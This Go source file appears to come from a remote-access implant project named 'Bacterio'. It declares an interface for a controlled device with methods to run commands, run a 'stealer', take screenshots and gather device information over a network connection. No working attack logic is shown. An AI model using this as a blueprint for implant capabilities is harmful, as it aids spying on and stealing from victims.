package service

import (
	"net"

	"github.com/fr13n8/Bacterio/internal/models"
)

// type Cmd interface {
// }

type Device interface {
	Send(request models.Message) error
	Write(v string) error
	Read() (*models.Message, error)
	GetInfoAboutDevice() error
	Run(cmd string)
	RunStiller()
	TakeScreenshot()
}

type Service struct {
	// Cmd
	Device
}

func NewService(conn net.Conn) *Service {
	return &Service{
		// Cmd:    NewCmdService(),
		Device: NewImplantService(conn),
	}
}
